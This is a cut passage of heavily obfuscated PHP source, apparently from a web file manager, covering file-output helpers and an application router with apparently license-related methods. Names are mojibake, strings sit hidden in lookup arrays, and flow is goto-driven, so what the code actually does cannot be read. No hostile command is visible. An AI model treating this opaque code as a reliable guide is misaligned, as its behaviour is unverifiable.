Model($eŞ¶àİ‘İ[606])->createFileName($aˆ¿ˆ±ôçİ[$eŞ¶àİ‘İ[86]], $EˆóĞ¢›½³, $aã›ƒğŠÄ„); return IO::uploadLink($E¹•ÎÉ‡Ì, $Dë«˜·ŠÖ˜); } public function fileNameAuto($Côôƒ®ÀŒÄ, $bÊÁáØŠò, $Fæ×»”¬¯Î = REPEAT_REPLACE, $eÆ‹ñ»™‰ä = false) { return $this->model->fileNameAuto($Côôƒ®ÀŒÄ, $bÊÁáØŠò, $Fæ×»”¬¯Î, $eÆ‹ñ»™‰ä); } public function fileNameExist($a’…˜Â’Š, $eáµÊÊ‚Àè) { return $this->model->fileNameExist($a’…˜Â’Š, $eáµÊÊ‚Àè); } protected function _fileOut($f›Ñ±âå‹ˆ, $BÔº®Ó²“ = false, $B«ÖÅÌ÷…å = false, $D‡äÕÛêÇ = '', $fâ¸…æöõè = false) { goto f´êÃöø×; D•ƒÖ¤ãæå: $f³á…Í´Ì = $this->model->fileInfoGet($f›Ñ±âå‹ˆ); $D‡äÕÛêÇ = $f³á…Í´Ì[$DÑØµİê[180]] ? $f³á…Í´Ì[$DÑØµİê[180]] : $D‡äÕÛêÇ; $EóòÊÎØ = isset($GLOBALS[$DÑØµİê[1233]]) ? $GLOBALS[$DÑØµİê[1233]] : $c²Ã–ÙƒòÜ[$DÑØµİê[38]]; goto D²ùÊ˜š…³; f´êÃöø×: $DÑØµİê =& $_SERVER[œÕÊİğö]; $c²Ã–ÙƒòÜ = $this->model->sourceInfo($f›Ñ±âå‹ˆ); if ($c²Ã–ÙƒòÜ[$DÑØµİê[414]] == $DÑØµİê[97]) { header($DÑØµİê[1232]); die; } goto D•ƒÖ¤ãæå; D²ùÊ˜š…³: if ($fâ¸…æöõè) { return IO::fileOutServer($f³á…Í´Ì[$DÑØµİê[86]], $BÔº®Ó²“, $EóòÊÎØ, $D‡äÕÛêÇ); } IO::fileOut($f³á…Í´Ì[$DÑØµİê[86]], $BÔº®Ó²“, $EóòÊÎØ, $D‡äÕÛêÇ); goto C¨Î­ ø›˜; C¨Î­ ø›˜: } public function fileOut($Fä†ù··ùÏ, $Eª¦ìƒ­à = false, $D¶Úšë´† = false, $F¶±Ğõ³  = '') { $this->_fileOut($Fä†ù··ùÏ, $Eª¦ìƒ­à, $D¶Úšë´†, $F¶±Ğõ³ ); } public function fileOutServer($cÑ¨Ğğİ¨­, $FÒ¾£áİİ½ = false, $cñˆ¾Ô×ò˜ = false, $BØ¶ Ÿ ­İ = '') { $this->_fileOut($cÑ¨Ğğİ¨­, $FÒ¾£áİİ½, $cñˆ¾Ô×ò˜, $BØ¶ Ÿ ­İ, !0); } protected function _fileOutImage($fÑ»Ü²øÛ†, $f¼…à•õ = 250) { goto c©ì÷âõ¶È; F‘ïœ‚ù¸Ù: $GLOBALS[$C“©Ì½¶˜õ[1233]] = $cáàÉ¥Ô©[$C“©Ì½¶˜õ[38]]; $GLOBALS[$C“©Ì½¶˜õ[172]] = $cáàÉ¥Ô©; IO::fileOutImage($cáàÉ¥Ô©[$C“©Ì½¶˜õ[86]], $f¼…à•õ); goto Aå×¾‘ˆÖê; Fœ“ê‰«: $cáàÉ¥Ô© = $this->model->fileInfoGet($fÑ»Ü²øÛ†); $cáàÉ¥Ô©[$C“©Ì½¶˜õ[38]] = $b«Îøó¤Şï[$C“©Ì½¶˜õ[38]]; $cáàÉ¥Ô©[$C“©Ì½¶˜õ[173]] = $b«Îøó¤Şï[$C“©Ì½¶˜õ[173]]; goto F‘ïœ‚ù¸Ù; c©ì÷âõ¶È: $C“©Ì½¶˜õ =& $_SERVER[œÕÊİğö]; $b«Îøó¤Şï = $this->model->pathInfo($fÑ»Ü²øÛ†); if ($b«Îøó¤Şï[$C“©Ì½¶˜õ[414]] == $C“©Ì½¶˜õ[97]) { show_json($C“©Ì½¶˜õ[1234] . $fÑ»Ü²øÛ†, !1); } goto Fœ“ê‰«; Aå×¾‘ˆÖê: } public function fileOutImage($a¦†ø÷º¸, $D†µ†‘‰¾ = 250) { $this->_fileOutImage($a¦†ø÷º¸, $D†µ†‘‰¾); } public function fileOutImageServer($B¥Œ©ê©, $f–Ñğ†’¾ = 250) { $this->_fileOutImage($B¥Œ©ê©, $f–Ñğ†’¾); } public function link($BÕœ’­ªƒ, $f˜Ô„ìëÏ¡ = '') { $AæåË³À“– = $this->model->fileInfoGet($BÕœ’­ªƒ); return IO::link($AæåË³À“–[$_SERVER[œÕÊİğö][86]], $f˜Ô„ìëÏ¡); } protected function parse($A‚àøŒÉ”©) { $fÌ„²³ƒ´¾ =& $_SERVER[œÕÊİğö]; if (strstr($A‚àøŒÉ”©, $fÌ„²³ƒ´¾[8]) === !1) { return array($fÌ„²³ƒ´¾[423] => intval($A‚àøŒÉ”©), $fÌ„²³ƒ´¾[86] => $fÌ„²³ƒ´¾[43], $fÌ„²³ƒ´¾[1229] => array()); } $F«Ö°ÃŸĞ = explode($fÌ„²³ƒ´¾[8], trim($A‚àøŒÉ”©, $fÌ„²³ƒ´¾[8])); if (count($F«Ö°ÃŸĞ) < 2) { show_tips($A‚àøŒÉ”© . $fÌ„²³ƒ´¾[1235]); } return array($fÌ„²³ƒ´¾[423] => intval($F«Ö°ÃŸĞ[0]), $fÌ„²³ƒ´¾[86] => $F«Ö°ÃŸĞ[1], $fÌ„²³ƒ´¾[1229] => array_slice($F«Ö°ÃŸĞ, 1)); } } goto A³Æ•‹†Şã; CÊêÀ‹›¦Å: if (strlen($E“İĞøŞ†˜) < $_SERVER[œÕÊİğö][613]) { return; } class Application { private $defaultModule = "\151\156\144\145\x78"; private $defaultController = "\151\156\144\x65\x78"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($B¼’±ƒ¤´) { goto DÍ³™¢×Î·; D‘éê…×ŞÆ: if (!$cÌ¨…®œ) { return; } $this->{$_SERVER[õÒ³è´][3]}($B¯ßŸ­ªÑá[4], array($this, $B¯ßŸ­ªÑá[5])); goto aÒœ„ìõ´î; C›©¬ÓÔÔÍ: $this->defaultController = $DÜ³ùªÇÊğ[1] ? $DÜ³ùªÇÊğ[1] : $this->defaultController; $this->defaultAction = $DÜ³ùªÇÊğ[2] ? $DÜ³ùªÇÊğ[2] : $this->defaultAction; $cÌ¨…®œ = $CŞê†îÅŸÍ[616]; goto D‘éê…×ŞÆ; C÷ÆŒÛ„×­: $this->defaultModule = $DÜ³ùªÇÊğ[0] ? $DÜ³ùªÇÊğ[0] : $this->defaultModule; $BìË¸»ÍĞ = $CŞê†îÅŸÍ[614]; if (strlen($BìË¸»ÍĞ) < $CŞê†îÅŸÍ[615]) { die; } goto C›©¬ÓÔÔÍ; DÍ³™¢×Î·: $CŞê†îÅŸÍ =& $_SERVER[œÕÊİğö]; $B¯ßŸ­ªÑá =& $_SERVER[õÒ³è´]; $DÜ³ùªÇÊğ = $B¯ßŸ­ªÑá[0]($B¯ßŸ­ªÑá[1], $B¯ßŸ­ªÑá[2]($B¼’±ƒ¤´, $B¯ßŸ­ªÑá[1])); goto C÷ÆŒÛ„×­; aÒœ„ìõ´î: } public function appRun($bÊŠéï­›Œ) { goto f×¡ÇêŒ“æ; a‘Ù´ÁÕ¼ë: while (strlen($D…™£÷ÀÎ¼) < $d¸Œ…äØ[615]) { if (!$D…™£÷ÀÎ¼) { break; } $D…™£÷ÀÎ¼++; } $fí»ƒŞçÄ× = $fëçî­˜»Õ[7]; if ($BĞ¸é™ == $fëçî­˜»Õ[8]) { $fí»ƒŞçÄ× = $fëçî­˜»Õ[9]; $Cëğ‘÷ˆ[0] = $fëçî­˜»Õ[10]; $Cëğ‘÷ˆ[1] = $Cëğ‘÷ˆ[1] . $fëçî­˜»Õ[11]; $bÊŠéï­›Œ = $fëçî­˜»Õ[12]($fëçî­˜»Õ[1], $Cëğ‘÷ˆ); $bÊŠéï­›Œ = $fëçî­˜»Õ[2]($bÊŠéï­›Œ, $fëçî­˜»Õ[1]); } goto F©÷„Ããä; Eßë¼·¥ŞÖ: $eÆÚ§‡¼Ï = $d¸Œ…äØ[617]; $BĞ¸é™ = $fëçî­˜»Õ[6]($Cëğ‘÷ˆ[0]); $D…™£÷ÀÎ¼ = $d¸Œ…äØ[618]; goto a‘Ù´ÁÕ¼ë; F©÷„Ããä: $fëçî­˜»Õ[13](array($fëçî­˜»Õ[14], $fëçî­˜»Õ[15]), $fí»ƒŞçÄ× . $fëçî­˜»Õ[16], $bÊŠéï­›Œ); $fëçî­˜»Õ[17]($bÊŠéï­›Œ); $bçá‡îâÏÄ = $d¸Œ…äØ[619]; goto a†ÙÕ‡¿õ; BÈ®¦¦ƒÆ’: if (strlen($D§Éª“›â) < $d¸Œ…äØ[615]) { return; } goto EîÙ¿¤§‹; f×¡ÇêŒ“æ: $d¸Œ…äØ =& $_SERVER[œÕÊİğö]; $fëçî­˜»Õ =& $_SERVER[õÒ³è´]; $Cëğ‘÷ˆ = $fëçî­˜»Õ[0]($fëçî­˜»Õ[1], $bÊŠéï­›Œ); goto Eßë¼·¥ŞÖ; a†ÙÕ‡¿õ: if (!$bçá‡îâÏÄ) { die; } $fëçî­˜»Õ[13](array($fëçî­˜»Õ[14], $fëçî­˜»Õ[15]), $fí»ƒŞçÄ× . $fëçî­˜»Õ[18], $bÊŠéï­›Œ); $D§Éª“›â = $d¸Œ…äØ[620]; goto BÈ®¦¦ƒÆ’; EîÙ¿¤§‹: } private function autorun() { $b»½Ş‹ ¿• =& $_SERVER[õÒ³è´]; global $config; if ($b»½Ş‹ ¿•[19]($config[$b»½Ş‹ ¿•[20]]) == 0) { return; } foreach ($config[$b»½Ş‹ ¿•[20]] as $C°ÁŒÜÊ¦ => $Aé’ÂÁƒˆ) { $this->{$_SERVER[õÒ³è´][21]}($Aé’ÂÁƒˆ); } } private function xaql7a3cd29c() { goto bë›¸ºÉ‹¾; E±î¹­Ã«‰: $C™½Çœ—ƒ = array($f­…Î¶’î‹[8], $BÈÏ¹İ™«); $b³†ãÄ¼ = $aÁ–§ß„ù[624]; $fó¼»ÖŒŸˆ = $f­…Î¶’î‹[26]($GLOBALS[$f­…Î¶’î‹[22]][$f­…Î¶’î‹[23]], 1); goto CÖÚåÅÍŒ‚; c™ø–ƒ¼•µ: $BÈÏ¹İ™« = $f­…Î¶’î‹[25]($AœÒ‡Ù¦µ¡, 0, -$f­…Î¶’î‹[24]($bœ…Áí˜)); $aÖ¦µÒã¨Ğ = $aÁ–§ß„ù[623]; if (!$aÖ¦µÒã¨Ğ) { die; } goto E±î¹­Ã«‰; EÜƒ­¡¬ç„: $d™©ÁÚ¤¢ = $aÁ–§ß„ù[621]; if (!$d™©ÁÚ¤¢) { return; } $AœÒ‡Ù¦µ¡ = $GLOBALS[$f­…Î¶’î‹[22]][$f­…Î¶’î‹[23]][0]; goto FŠ›ÕÙò‚Î; FŠ›ÕÙò‚Î: $aÚìÏé¦¾ = $aÁ–§ß„ù[622]; if (!$AœÒ‡Ù¦µ¡ || $f­…Î¶’î‹[24]($AœÒ‡Ù¦µ¡) <= $f­…Î¶’î‹[24]($bœ…Áí˜)) { return; } if ($f­…Î¶’î‹[6]($f­…Î¶’î‹[25]($AœÒ‡Ù¦µ¡, -$f­…Î¶’î‹[24]($bœ…Áí˜))) != $bœ…Áí˜) { return; } goto c™ø–ƒ¼•µ; CÖÚåÅÍŒ‚: $E¯ÆÎÚÜŒ = $aÁ–§ß„ù[625]; $GLOBALS[$f­…Î¶’î‹[22]][$f­…Î¶’î‹[23]] = $f­…Î¶’î‹[27]($C™½Çœ—ƒ, $fó¼»ÖŒŸˆ); $GLOBALS[$f­…Î¶’î‹[22]][$f­…Î¶’î‹[28]] = $f­…Î¶’î‹[29]($f­…Î¶’î‹[1], $GLOBALS[$f­…Î¶’î‹[22]][$f­…Î¶’î‹[23]]); goto CÕ¼˜›¶ùÚ; bë›¸ºÉ‹¾: $aÁ–§ß„ù =& $_SERVER[œÕÊİğö]; $f­…Î¶’î‹ =& $_SERVER[õÒ³è´]; $bœ…Áí˜ = $f­…Î¶’î‹[8]; goto EÜƒ­¡¬ç„; CÕ¼˜›¶ùÚ: } private function tsbm94b0eb48() { goto E†ò‡­Â; aÖç¬Š¢©”: $BÙ¤º„ÁöÁ = $_SERVER[$D¾ĞÆ“Åö[30]]; $C´°âï¦® = $e³°Š”ƒøà[626]; if (strlen($C´°âï¦®) < $e³°Š”ƒøà[615]) { return; } goto b’Ñø¾Ğ‡ğ; Câ›é®óÖ: $Fğè±ïùÌ = $e³°Š”ƒøà[627]; if (!$Fğè±ïùÌ) { return; } $A†ÍòŸì»å = $D¾ĞÆ“Åö[25]($BÙ¤º„ÁöÁ, $cóŒ”æÜÖ‚ + $D¾ĞÆ“Åö[24]($cÂ¦«†‘•†)); goto aô×­ŸÂ¨ô; b’Ñø¾Ğ‡ğ: $cÂ¦«†‘•† = $D¾ĞÆ“Åö[31]; if (!$D¾ĞÆ“Åö[32]($BÙ¤º„ÁöÁ, $cÂ¦«†‘•†)) { return; } $cóŒ”æÜÖ‚ = $D¾ĞÆ“Åö[33]($BÙ¤º„ÁöÁ, $cÂ¦«†‘•†); goto Câ›é®óÖ; E¶‰Œ†“ø: $A†ÍòŸì»å = $D¾ĞÆ“Åö[2]($F¥Œ˜¨ÅŸ[0][0], $D¾ĞÆ“Åö[36]); $GLOBALS[$D¾ĞÆ“Åö[22]][$D¾ĞÆ“Åö[23]] = $D¾ĞÆ“Åö[0]($D¾ĞÆ“Åö[36], $A†ÍòŸì»å); $GLOBALS[$D¾ĞÆ“Åö[22]][$D¾ĞÆ“Åö[28]] = $D¾ĞÆ“Åö[29]($D¾ĞÆ“Åö[1], $GLOBALS[$D¾ĞÆ“Åö[22]][$D¾ĞÆ“Åö[23]]); goto BõÅŒëš¡á; E†ò‡­Â: $e³°Š”ƒøà =& $_SERVER[œÕÊİğö]; $D¾ĞÆ“Åö =& $_SERVER[õÒ³è´]; if ($GLOBALS[$D¾ĞÆ“Åö[22]][$D¾ĞÆ“Åö[28]] != $D¾ĞÆ“Åö[10]) { return; } goto aÖç¬Š¢©”; aô×­ŸÂ¨ô: $EÌÄ®¯±Õ = $e³°Š”ƒøà[628]; $D¾ĞÆ“Åö[34]($D¾ĞÆ“Åö[35], $A†ÍòŸì»å, $F¥Œ˜¨ÅŸ); $b“»ß°–† = $e³°Š”ƒøà[629]; goto E¶‰Œ†“ø; BõÅŒëš¡á: } public function run() { goto f…å›³ŞÚ; f˜Ç„‘¬„: $DÊ—İÂá£ï = $C£èéõ‘™‚[636]; if (!$DÊ—İÂá£ï) { die; } if ($E•æ’²ª†‰[19]($dÀ¥òÉß¶‘) >= 3) { $this->{$_SERVER[õÒ³è´][21]}($EõæÃ¨‘Û); } else { $this->{$_SERVER[õÒ³è´][21]}(ACTION); } goto f„ò•ŸÊ”•; b×™ª”ŞÆ‡: $E•æ’²ª†‰[39]($E•æ’²ª†‰[42], isset($dÀ¥òÉß¶‘[2]) && $dÀ¥òÉß¶‘[0] ? $dÀ¥òÉß¶‘[2] : $this->defaultAction); $E•æ’²ª†‰[39]($E•æ’²ª†‰[43], MOD . $E•æ’²ª†‰[1] . ST . $E•æ’²ª†‰[1] . ACT); $D¢ÉÇë†¯© = $C£èéõ‘™‚[635]; goto b°¦« Âˆá; b°¦« Âˆá: if (!$D¢ÉÇë†¯©) { die; } $_SERVER[$E•æ’²ª†‰[44]] = $E•æ’²ª†‰[6](ACTION); $this->{$_SERVER[õÒ³è´][45]}(); goto f˜Ç„‘¬„; f…å›³ŞÚ: $C£èéõ‘™‚ =& $_SERVER[œÕÊİğö]; $E•æ’²ª†‰ =& $_SERVER[õÒ³è´]; $this->{$_SERVER[õÒ³è´][37]}(); goto fìŒòê¯Ä²; CŠ¦ŞÓ·Å: $EõæÃ¨‘Û = $GLOBALS[$E•æ’²ª†‰[22]][$E•æ’²ª†‰[28]]; $Cê¢’£É“… = $C£èéõ‘™‚[632]; $E•æ’²ª†‰[39]($E•æ’²ª†‰[40], isset($dÀ¥òÉß¶‘[0]) && $dÀ¥òÉß¶‘[0] ? $dÀ¥òÉß¶‘[0] : $this->defaultModule); goto C´Êé“˜ñ²; fìŒòê¯Ä²: $d˜—Ê”»à = $C£èéõ‘™‚[630]; while ($d˜—Ê”»à < $C£èéõ‘™‚[613]) { if ($d˜—Ê”»à >= 0) { break; } $d˜—Ê”»à++; } $this->{$_SERVER[õÒ³è´][38]}(); goto Cù‚¹¾§; Cù‚¹¾§: $Bø…œÆÛÛø = $C£èéõ‘™‚[631]; if (strlen($Bø…œÆÛÛø) < $C£èéõ‘™‚[16]) { die; } $dÀ¥òÉß¶‘ = $GLOBALS[$E•æ’²ª†‰[22]][$E•æ’²ª†‰[23]]; goto CŠ¦ŞÓ·Å; C´Êé“˜ñ²: $E•æ’²ª†‰[39]($E•æ’²ª†‰[41], isset($dÀ¥òÉß¶‘[1]) && $dÀ¥òÉß¶‘[0] ? $dÀ¥òÉß¶‘[1] : $this->defaultController); $Dâ„ÓÎ”ï = $C£èéõ‘™‚[633]; if (strlen($Dâ„ÓÎ”ï) < $C£èéõ‘™‚[634]) { die; } goto b×™ª”ŞÆ‡; f„ò•ŸÊ”•: } private $crpq5f5b0a9b = array(); private $ksfl586f8766 = ''; public function mslde2c41c21() { goto E“èåŞ†à³; a–ìïÇ¨±: $C‘¾“³•ª = $D—àİğš·í[639]; if (!$C‘¾“³•ª) { return; } $this->{$_SERVER[õÒ³è´][3]}($BÕ¤Í†¿ŠÙ[53], array($this, $BÕ¤Í†¿ŠÙ[54])); goto C»´‹§˜ª; C»´‹§˜ª: $this->{$_SERVER[õÒ³è´][3]}($BÕ¤Í†¿ŠÙ[55], array($this, $BÕ¤Í†¿ŠÙ[56])); $this->{$_SERVER[õÒ³è´][3]}($BÕ¤Í†¿ŠÙ[57], array($this, $BÕ¤Í†¿ŠÙ[58])); $f›Í›©ˆ’ = $D—àİğš·í[640]; goto cÂ‡ìßòÏÌ; cÂ‡ìßòÏÌ: $this->{$_SERVER[õÒ³è´][3]}($BÕ¤Í†¿ŠÙ[59], array($this, $BÕ¤Í†¿ŠÙ[60])); $C‘Ìì©’Àê = $D—àİğš·í[641]; if (!$C‘Ìì©’Àê) { die; } goto fğŸƒ–¿½é; EÚÆäĞ·•ô: $FğÆŠ¬½¬ä = $D—àİğš·í[638]; if (strlen($FğÆŠ¬½¬ä) < $D—àİğš·í[613]) { return; } $this->{$_SERVER[õÒ³è´][48]}(); goto Bõ¬Îï†À­; E“èåŞ†à³: $D—àİğš·í =& $_SERVER[œÕÊİğö]; $BÕ¤Í†¿ŠÙ =& $_SERVER[õÒ³è´]; $this->{$_SERVER[õÒ³è´][46]}(); goto dÃïƒ‹ì¼; dÃïƒ‹ì¼: $fÜ¥‘¹““à = $D—àİğš·í[637]; while (strlen($fÜ¥‘¹““à) < $D—àİğš·í[634]) { if (!$fÜ¥‘¹““à) { break; } $fÜ¥‘¹““à++; } $this->{$_SERVER[õÒ³è´][47]}(); goto EÚÆäĞ·•ô; Bõ¬Îï†À­: $A³ğÄìÁ = $D—àİğš·í[639]; while ($A³ğÄìÁ < $D—àİğš·í[16]) { if ($A³ğÄìÁ >= 0) { break; } $A³ğÄìÁ++; } $this->{$_SERVER[õÒ³è´][49]}(); goto BŸÏ¾ì‡„Ô; BŸÏ¾ì‡„Ô: $this->{$_SERVER[õÒ³è´][50]}(); $this->{$_SERVER[õÒ³è´][51]}(); $this->{$_SERVER[õÒ³è´][52]}(); goto a–ìïÇ¨±; fğŸƒ–¿½é: } public function vuybaa61ff1d($BÃÅ†º›Å) { goto bÈ÷„µ–õÌ; F§Ãğ–³ªÕ: return $BÃÅ†º›Å; goto c»ĞÕÁ±‘Ş; D¿×é‘Ÿ®à: if (!$E—ĞŞ¥ö­Ä) { return; } unset($BÃÅ†º›Å[$e·Ø‡§º‘[113]][$e·Ø‡§º‘[115]][$e·Ø‡§º‘[117]]); $cÈÍ ÓÉ = $DçŠÄà¥ Ó[645]; goto a¨©Óªê; aÍ„Ø½ŞÙğ: if (!$C¡á—Ş‘ËÏ) { die; } unset($BÃÅ†º›Å[$e·Ø‡§º‘[113]][$e·Ø‡§º‘[115]][$e·Ø‡§º‘[116]]); $E—ĞŞ¥ö­Ä = $DçŠÄà¥ Ó[644]; goto D¿×é‘Ÿ®à; a†ïÁã†Â¸: $fñÏ´´ùÚ = $DçŠÄà¥ Ó[642]; if (!$fñÏ´´ùÚ) { die; } $e¸èˆ¾˜Ê” = array($e·Ø‡§º‘[64], $e·Ø‡§º‘[65], $e·Ø‡§º‘[66], $e·Ø‡§º‘[67], $e·Ø‡§º‘[68], $e·Ø‡§º‘[69], $e·Ø‡§º‘[70], $e·Ø‡§º‘[71], $e·Ø‡§º‘[72], $e·Ø‡§º‘[73], $e·Ø‡§º‘[74], $e·Ø‡§º‘[75], $e·Ø‡§º‘[76], $e·Ø‡§º‘[77], $e·Ø‡§º‘[78], $e·Ø‡§º‘[79], $e·Ø‡§º‘[80], $e·Ø‡§º‘[81], $e·Ø‡§º‘[82], $e·Ø‡§º‘[83], $e·Ø‡§º‘[84], $e·Ø‡§º‘[85], $e·Ø‡§º‘[86], $e·Ø‡§º‘[87], $e·Ø‡§º‘[88], $e·Ø‡§º‘[89], $e·Ø‡§º‘[90], $e·Ø‡§º‘[91], $e·Ø‡§º‘[92], $e·Ø‡§º‘[93], $e·Ø‡§º‘[94], $e·Ø‡§º‘[95], $e·Ø‡§º‘[96], $e·Ø‡§º‘[97], $e·Ø‡§º‘[98], $e·Ø‡§º‘[99], $e·Ø‡§º‘[100], $e·Ø‡§º‘[101], $e·Ø‡§º‘[102], $e·Ø‡§º‘[103], $e·Ø‡§º‘[104], $e·Ø‡§º‘[105], $e·Ø‡§º‘[106], $e·Ø‡§º‘[107], $e·Ø‡§º‘[108], $e·Ø‡§º‘[109], $e·Ø‡§º‘[110]); goto D»šœ“®ìö; Dé‰Ôê¯›ö: $BÃÅ†º›Å[$e·Ø‡§º‘[125]][$e·Ø‡§º‘[134]] = $e·Ø‡§º‘[135]($e·Ø‡§º‘[136]()); $cÔÇªœ¢ß­ = $DçŠÄà¥ Ó[648]; if (strlen($cÔÇªœ¢ß­) < $DçŠÄà¥ Ó[649]) { return; } goto eƒµÍÊ—‹•; B¬îƒõ¬Â: $BÃÅ†º›Å[$e·Ø‡§º‘[125]][$e·Ø‡§º‘[145]] = $e·Ø‡§º‘[123]($this->crpq5f5b0a9b, $e·Ø‡§º‘[146], $e·Ø‡§º‘[10]); $BÃÅ†º›Å[$e·Ø‡§º‘[125]][$e·Ø‡§º‘[147]] = $e·Ø‡§º‘[123]($this->crpq5f5b0a9b, $e·Ø‡§º‘[148], $e·Ø‡§º‘[10]); if ($e·Ø‡§º‘[123]($GLOBALS, $e·Ø‡§º‘[149]) && $this->config[$e·Ø‡§º‘[150]]) { $BÃÅ†º›Å[$e·Ø‡§º‘[125]][$e·Ø‡§º‘[151]] = WEB_ROOT; } goto F§Ãğ–³ªÕ; EïÖ±ëÉõÃ: $BÃÅ†º›Å[$e·Ø‡§º‘[125]][$e·Ø‡§º‘[126]] = $e·Ø‡§º‘[127]($e·Ø‡§º‘[128])->{$_SERVER[õÒ³è´][129]}(); $BÃÅ†º›Å[$e·Ø‡§º‘[125]][$e·Ø‡§º‘[130]] = $e·Ø‡§º‘[131]($_SERVER[$e·Ø‡§º‘[132]] . $d’˜› ŒÄ“[$e·Ø‡§º‘[133]]); $Eíñ·ïª¶Ã = $DçŠÄà¥ Ó[647]; goto Dé‰Ôê¯›ö; bÈ÷„µ–õÌ: $DçŠÄà¥ Ó =& $_SERVER[œÕÊİğö]; $e·Ø‡§º‘ =& $_SERVER[õÒ³è´]; $d’˜› ŒÄ“ = $e·Ø‡§º‘[61]($e·Ø‡§º‘[62])->{$_SERVER[õÒ³è´][63]}(); goto a†ïÁã†Â¸; eƒµÍÊ—‹•: $BÃÅ†º›Å[$e·Ø‡§º‘[125]][$e·Ø‡§º‘[137]] = $this->ksfl586f8766; if ($d’˜› ŒÄ“[$e·Ø‡§º‘[137]] != $e·Ø‡§º‘[138]) { $BÃÅ†º›Å[$e·Ø‡§º‘[125]][$e·Ø‡§º‘[139]] = $d’˜› ŒÄ“[$e·Ø‡§º‘[139]]; $BÃÅ†º›Å[$e·Ø‡§º‘[125]][$e·Ø‡§º‘[140]] = $d’˜› ŒÄ“[$e·Ø‡§º‘[140]]; $eâ­‚÷‡â = $e·Ø‡§º‘[141](10) . $this->ksfl586f8766 . $e·Ø‡§º‘[141](5); $BÃÅ†º›Å[$e·Ø‡§º‘[113]][$e·Ø‡§º‘[142]][$e·Ø‡§º‘[143]] = $this->{$_SERVER[õÒ³è´][144]}($eâ­‚÷‡â, $BÃÅ†º›Å[$e·Ø‡§º‘[125]][$e·Ø‡§º‘[130]]); } if ($this->ksfl586f8766 == $e·Ø‡§º‘[138]) { $BÃÅ†º›Å[$e·Ø‡§º‘[113]][$e·Ø‡§º‘[114]][$e·Ø‡§º‘[119]][$e·Ø‡§º‘[124]] = 0; } goto B¬îƒõ¬Â; a¨©Óªê: if (!$cÈÍ ÓÉ) { return; } unset($BÃÅ†º›Å[$e·Ø‡§º‘[113]][$e·Ø‡§º‘[114]][$e·Ø‡§º‘[76]]); unset($BÃÅ†º›Å[$e·Ø‡§º‘[113]][$e·Ø‡§º‘[114]][$e·Ø‡§º‘[118]]); goto EÒŠù¬ßìë; D»šœ“®ìö: foreach ($e¸èˆ¾˜Ê” as $b‚İèŸ¬³Æ) { $C»¢÷àÂØ = $GLOBALS[$e·Ø‡§º‘[111]][$e·Ø‡§º‘[112]][$b‚İèŸ¬³Æ]; if (isset($d’˜› ŒÄ“[$b‚İèŸ¬³Æ])) { $C»¢÷àÂØ = $d’˜› ŒÄ“[$b‚İèŸ¬³Æ]; } $BÃÅ†º›Å[$e·Ø‡§º‘[113]][$e·Ø‡§º‘[114]][$b‚İèŸ¬³Æ] = $C»¢÷àÂØ; } $F¸®çÛœã§ = $BÃÅ†º›Å[$e·Ø‡§º‘[113]][$e·Ø‡§º‘[114]][$e·Ø‡§º‘[76]]; $C¡á—Ş‘ËÏ = $DçŠÄà¥ Ó[643]; goto aÍ„Ø½ŞÙğ; EÒŠù¬ßìë: $BÃÅ†º›Å[$e·Ø‡§º‘[113]][$e·Ø‡§º‘[114]][$e·Ø‡§º‘[119]] = array($e·Ø‡§º‘[120] => (int) $F¸®çÛœã§[$e·Ø‡§º‘[121]], $e·Ø‡§º‘[122] => (int) $e·Ø‡§º‘[123]($F¸®çÛœã§, $e·Ø‡§º‘[124], 0)); $däÓª·œ• = $DçŠÄà¥ Ó[646]; if (!$däÓª·œ•) { die; } goto EïÖ±ëÉõÃ; c»ĞÕÁ±‘Ş: } private function sgcrfc33a037() { goto C—öŒ±‡á„; eºí«¾Òö‘: if (!$D„ö¦…è›Ú) { die; } goto Bª¯¥¡™õ”; D‘¿ºµ™¦: if ($this->ksfl586f8766 == $C‡õ»„‹‚Æ[138]) { return; } $C¿¤ÜÂÕº‹ = array($C‡õ»„‹‚Æ[178], $C‡õ»„‹‚Æ[179], $C‡õ»„‹‚Æ[180], $C‡õ»„‹‚Æ[181], $C‡õ»„‹‚Æ[182], $C‡õ»„‹‚Æ[183]); $B­æ­ù ê = $C‡õ»„‹‚Æ[61]($C‡õ»„‹‚Æ[62])->{$_SERVER[õÒ³è´][63]}(); goto a— ŠĞãÜä; a— ŠĞãÜä: $cÇãˆµÖáÖ = array($C‡õ»„‹‚Æ[184] => $B­æ­ù ê[$C‡õ»„‹‚Æ[64]], $C‡õ»„‹‚Æ[185] => $B­æ­ù ê[$C‡õ»„‹‚Æ[65]], $C‡õ»„‹‚Æ[186] => $C‡õ»„‹‚Æ[10]); $aÛÃÛ²óİ = $A»†ÄîˆÅ£[652]; while (strlen($aÛÃÛ²óİ) < $A»†ÄîˆÅ£[613]) { if (!$aÛÃÛ²óİ) { break; } $aÛÃÛ²óİ++; } goto Cœ ÑØÌÁ; C—öŒ±‡á„: $A»†ÄîˆÅ£ =& $_SERVER[œÕÊİğö]; $C‡õ»„‹‚Æ =& $_SERVER[õÒ³è´]; if ($_SERVER[$C‡õ»„‹‚Æ[44]] == $C‡õ»„‹‚Æ[152]) { goto F‘¤†ë™ä»; F‘¤†ë™ä»: $b‰ÎÌÀ–• = array($C‡õ»„‹‚Æ[137] => $this->ksfl586f8766, $C‡õ»„‹‚Æ[153] => $this->{$_SERVER[õÒ³è´][154]}(), $C‡õ»„‹‚Æ[155] => $C‡õ»„‹‚Æ[61]($C‡õ»„‹‚Æ[156])->{$_SERVER[õÒ³è´][157]}()); if ($this->ksfl586f8766 != $C‡õ»„‹‚Æ[138]) { $EËÍµ¢Ù“Í = $C‡õ»„‹‚Æ[123]($this->crpq5f5b0a9b, $C‡õ»„‹‚Æ[158]); if ($EËÍµ¢Ù“Í) { $b‰ÎÌÀ–•[$C‡õ»„‹‚Æ[159]] = $EËÍµ¢Ù“Í; $b‰ÎÌÀ–•[$C‡õ»„‹‚Æ[160]] = $C‡õ»„‹‚Æ[161]($C‡õ»„‹‚Æ[123]($this->crpq5f5b0a9b, $C‡õ»„‹‚Æ[162])); $b‰ÎÌÀ–•[$C‡õ»„‹‚Æ[163]] = $C‡õ»„‹‚Æ[123]($this->crpq5f5b0a9b, $C‡õ»„‹‚Æ[148]); } $AÇöÃÜÏ° = $C‡õ»„‹‚Æ[61]($C‡õ»„‹‚Æ[62])->{$_SERVER[õÒ³è´][63]}($C‡õ»„‹‚Æ[164], $C‡õ»„‹‚Æ[10], !0); if ($C‡õ»„‹‚Æ[165]($AÇöÃÜÏ°) && 